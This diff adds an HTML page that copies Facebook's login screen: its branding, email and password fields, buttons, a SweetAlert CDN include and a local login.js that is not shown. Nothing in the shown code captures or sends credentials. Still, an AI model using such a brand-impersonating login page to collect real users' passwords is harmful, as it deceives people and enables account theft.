@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="login.css">
+    <title>Facebook Login</title>
+</head>
+<body>
+
+<div class="container">
+    <div class="left">
+        <h1>facebook</h1>
+        <p>Facebook helps you connect and share with people in your life.</p>
+    </div>
+
+    <div class="right">
+        <form>
+            <input id="email" type="text" placeholder="Email or phone number" autocomplete="username">
+            <input id="password" type="password" placeholder="Password" autocomplete="current-password">
+            <button type="submit" id="login">Log In</button>
+        </form>
+
+        <a href="#">Forgotten password?</a>
+        <hr>
+
+        <button id="create-account">Create New Account</button>
+    </div>
+</div>
+
+<!-- SweetAlert CDN -->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<!-- JS file -->
+<script src="login.js"></script>
+
+</body>
+</html>
